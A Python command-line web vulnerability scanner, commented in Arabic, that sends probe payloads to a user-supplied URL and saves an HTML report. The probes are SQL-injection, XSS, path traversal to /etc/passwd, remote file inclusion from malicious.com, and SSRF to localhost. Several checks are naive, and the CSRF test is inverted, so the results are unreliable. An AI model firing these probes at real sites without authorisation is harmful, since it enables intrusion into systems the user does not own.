import requests
import re
import pyfiglet
import socket
import os

# دالة للتحقق من الاتصال بالإنترنت
def check_internet():
    try:
        socket.create_connection(("www.google.com", 80))  # محاولة الاتصال بـ Google
        return True
    except OSError:
        return False

# دالة لفحص ثغرات SQL Injection
def check_sql_injection(url):
    try:
        response = requests.get(url + "'")
        if response.status_code == 500:
            return True
        else:
            return False
    except requests.RequestException:
        return False

# دالة لفحص ثغرات XSS
def check_xss(url):
    try:
        response = requests.get(url + "<script>alert('XSS')</script>")
        if "<script>alert('XSS')</script>" in response.text:
            return True
        else:
            return False
    except requests.RequestException:
        return False

# دالة لفحص ثغرات LFI
def check_lfi(url):
    try:
        response = requests.get(url + "/../../etc/passwd")
        if "root:" in response.text:
            return True
        else:
            return False
    except requests.RequestException:
        return False

# دالة لفحص ثغرات RFI
def check_rfi(url):
    try:
        response = requests.get(url + "?file=http://malicious.com/malicious_file")
        if "malicious_file" in response.text:
            return True
        else:
            return False
    except requests.RequestException:
        return False

# دالة لفحص CSRF
def check_csrf(url):
    try:
        headers = {'X-CSRF-Token': 'dummy_token'}
        response = requests.get(url, headers=headers)
        if response.status_code == 403:
            return True
        else:
            return False
    except requests.RequestException:
        return False

# دالة لفحص SSRF
def check_ssrf(url):
    try:
        response = requests.get(url + "?url=http://localhost:80")
        if "localhost" in response.text:
            return True
        else:
            return False
    except requests.RequestException:
        return False

# دالة لتحسين واجهة المستخدم مع الزخارف
def display_header():
    ascii_art = pyfiglet.figlet_format("V S")
    print(f"{bcolors.MAGENTA}{ascii_art}{bcolors.RESET}")
    print(f"{bcolors.CYAN}[INFO] by Screen{bcolors.RESET}")
    print(f"{bcolors.GREEN}===================================={bcolors.RESET}")

# دالة لتصدير النتائج إلى ملف HTML
def export_to_html(url, vulnerabilities):
    html_content = f"""
    <html>
        <head><title>Vulnerability Scan Report</title></head>
        <body>
            <h1>Vulnerability Scan Report for {url}</h1>
            <h2>Detected Vulnerabilities:</h2>
            <ul>
    """
    for vulnerability in vulnerabilities:
        html_content += f"<li>{vulnerability}</li>"
    
    html_content += """
            </ul>
        </body>
    </html>
    """
    
    with open("scan_report.html", "w") as file:
        file.write(html_content)
    print(f"{bcolors.YELLOW}✅ Scan report saved as 'scan_report.html'{bcolors.RESET}")

# دالة الرئيسة
def main():
    # مسح الشاشة قبل بداية التشغيل
    os.system("clear")
    
    display_header()

    # التحقق من الاتصال بالإنترنت
    if not check_internet():
        print(f"{bcolors.RED}❌ No internet connection. Please check your connection.{bcolors.RESET}")
        return

    url = input(f"{bcolors.YELLOW}Enter website URL (e.g., http://example.com): {bcolors.RESET}")

    vulnerabilities = []

    # فحص الثغرات
    if check_sql_injection(url):
        vulnerabilities.append(f"Potential SQL Injection vulnerability found at: {url}")
    if check_xss(url):
        vulnerabilities.append(f"Potential XSS vulnerability found at: {url}")
    if check_lfi(url):
        vulnerabilities.append(f"Potential LFI vulnerability found at: {url}")
    if check_rfi(url):
        vulnerabilities.append(f"Potential RFI vulnerability found at: {url}")
    if check_csrf(url):
        vulnerabilities.append(f"Potential CSRF vulnerability found at: {url}")
    if check_ssrf(url):
        vulnerabilities.append(f"Potential SSRF vulnerability found at: {url}")

    # عرض نتائج الفحص
    if vulnerabilities:
        print(f"\n{bcolors.GREEN}Scan completed!{bcolors.RESET}")
        for vulnerability in vulnerabilities:
            print(f"{bcolors.RED}{vulnerability}{bcolors.RESET}")
        # تصدير النتائج
        export_choice = input(f"\n{bcolors.YELLOW}Do you want to save the report to an HTML file? (yes/no): {bcolors.RESET}")
        if export_choice.lower() == "yes":
            export_to_html(url, vulnerabilities)
    else:
        print(f"{bcolors.GREEN}No vulnerabilities found.{bcolors.RESET}")

# تعريف الألوان
class bcolors:
    GREEN = '\033[32m'
    CYAN = '\033[36m'
    YELLOW = '\033[33m'
    MAGENTA = '\033[35m'
    RED = '\033[31m'
    RESET = '\033[0m'

if __name__ == "__main__":
    main()